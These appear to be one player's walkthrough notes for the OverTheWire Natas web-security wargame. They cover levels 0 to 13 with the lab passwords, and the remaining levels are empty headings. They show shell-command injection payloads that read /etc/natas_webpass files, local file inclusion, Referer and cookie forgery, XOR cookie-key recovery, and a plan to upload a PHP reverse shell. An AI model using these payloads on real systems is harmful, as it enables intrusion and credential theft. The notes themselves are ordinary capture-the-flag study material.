lvl 0:
-----------
http://natas0.natas.labs.overthewire.org/
natas0 : natas0


lvl 1:
-----------
ctrl + U 
<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->



lvl 2:
-----------
ctrl + U
<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->


lvl 3:
-----------
ctrl + U
->
http://natas2.natas.labs.overthewire.org/
->
<img src="files/pixel.png">
->
http://natas2.natas.labs.overthewire.org/files
->
http://natas2.natas.labs.overthewire.org/files/users.txt
->
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
->
G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q


lvl 4:
-----------
http://natas3.natas.labs.overthewire.org/robots.txt
->
User-agent: *
Disallow: /s3cr3t/
->
http://natas3.natas.labs.overthewire.org/s3cr3t/
->
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
->
natas4 : tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm



lvl 5:
-----------
open burp
->
change refered in request from
->
Referer: http://natas4.natas.labs.overthewire.org/
->
to
->
Referer: http://natas5.natas.labs.overthewire.org/
->
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD 


lvl 6:
-----------
open burp
->
Cookie: loggedin=0
->
Cookie: loggedin=1
->
 Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR



lvl 7:
-----------
click View sourcecode
->

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

->
include "includes/secret.inc";
->
http://natas6.natas.labs.overthewire.org/includes/secret.inc
->
ctrl + U
->
<?
  $secret = "FOEIUWGHFEEUHOFUOIU";
?>

->
enter in input secret 
->
Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 



lvl 8:
-----------
click home / about
->
http://natas7.natas.labs.overthewire.org/index.php?page=home
->
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
->
/etc/natas_webpass/natas8
->
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
->
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 


lvl 9:
-----------

->
click View sourcecode
->

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

->
encoded_secret = "3d3d516343746d4d6d6c315669563362"

# Reverse process:
# Step 1: Convert hex to binary
binary_secret = bytes.fromhex(encoded_secret)

# Step 2: Reverse the binary string
reversed_binary_secret = binary_secret[::-1]

# Step 3: Decode the base64 encoded string
original_secret = reversed_binary_secret.decode('base64')

original_secret
->
Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd



lvl 10:
-----------
->
; cat /etc/natas_webpass/natas10 &&
->
D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
->




lvl 11:
-----------
->
view source code
->
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}

->
https://security.stackexchange.com/questions/204213/can-i-inject-a-shell-command-here-in-php
->
POC :
line feed    ls    #
%0a          ls    #
%0Als#
?needle=%0Als#&submit=Search
->
?needle=%0Acat /etc/natas_webpass/natas11%0A#&submit=Search
->
1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg





lvl 12:
-----------
Cookies are protected with XOR encryption
->
enter burp + refresh
->
Cookies are protected with XOR encryption
->
Cookie: data=MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D
%3D in URL Encoding is '='
https://www.w3schools.com/tags/ref_urlencode.ASP
->
echo "MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=" | base64 -d
0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
->
https://www.rapidtables.com/convert/number/ascii-to-hex.html

->
view page source
->
visual code
->
we want to create the cookie manualy by reversing xor
to find the key. we will use the following schemes :
a ^ b = c ==> the original xor
c ^ b = a ==> to reverse a 
c ^ a = b ==> to reverse b

a = $defaultdata (after json) ==> array("showpassword"=>"no", "bgcolor"=>"#ffffff")
b = the missing key which is '<censored>' in xor_encrypt()
c = $_COOKIE['data'] ==> final result (o/ xored result)

the reverse actions (or reverse a/b)
c ^ a = b
$_COOKIE['data'] ^ json_encode($defaultdata) = the missing $key

once found the key all we needed is to generate the 
corect cookie is to change the $defaultdata array
to show the password or "showpassword"=>"yes"
->
changed source code:
<?php

$defaultdata = array( "showpassword"=>"yes", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = 'KNHL';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function xor_decrypt($in) {  
    $key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $text = $in; //cookie data
    $outText = ''; // key

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    echo $outText;
}


function saveData($d) {
    //setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
    echo base64_encode(xor_encrypt(json_encode($d)));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
echo xor_decrypt(base64_decode('MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D'));
?>

->
YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG

lvl 13:
-----------
->
view source code
->
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
->
the code does the following:
# strip the extention from $_FILES['filename'] ===> $ext
# create a random 10 character path name ==> genRandomString() ==> $target_path
# rename/move the uploaded file to upload/10_random_chars.ext ==> move_uploaded_file($uploaded, $target_path
->
looking at the upload post request
->
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
....
Content-Type: multipart/form-data; boundary=---------------------------308372928210774545253016154812

-----------------------------308372928210774545253016154812
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------308372928210774545253016154812
Content-Disposition: form-data; name="filename"

fzefz3rmv7.jpg
-----------------------------308372928210774545253016154812
Content-Disposition: form-data; name="uploadedfile"; filename="new_file.txt"
Content-Type: text/plain

line1
line2

-----------------------------308372928210774545253016154812--
->
boundary=---------------------------308372928210774545253016154812

name="filename"
fzefz3rmv7.jpg

name="uploadedfile"; filename="new_file.txt"
temp data
->
what we need to do to upload a reverse shell:
# change the lines attached to 'new_file.txt' ==> to have reverse shell
# change the extention of 'filename' ==> to be php ==> so the rev shell will work
# forward the message
->
lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
->

lvl 14:
-----------

->
->
->
->
->

lvl 15:
-----------
->
->
->
->
->

lvl 16:
-----------


lvl 17:
-----------


lvl 18:
-----------



lvl 19:
-----------


lvl 20:
-----------

lvl 21:
-----------

lvl 22:
-----------
lvl 23:
-----------
lvl 24:
-----------
lvl 25:
-----------
lvl 26:
-----------
lvl 27:
-----------
lvl 28:
-----------
lvl 29:
-----------
lvl 30:
-----------
lvl 31:
-----------
lvl 32:
-----------
lvl 33:
-----------
lvl 34:
-----------
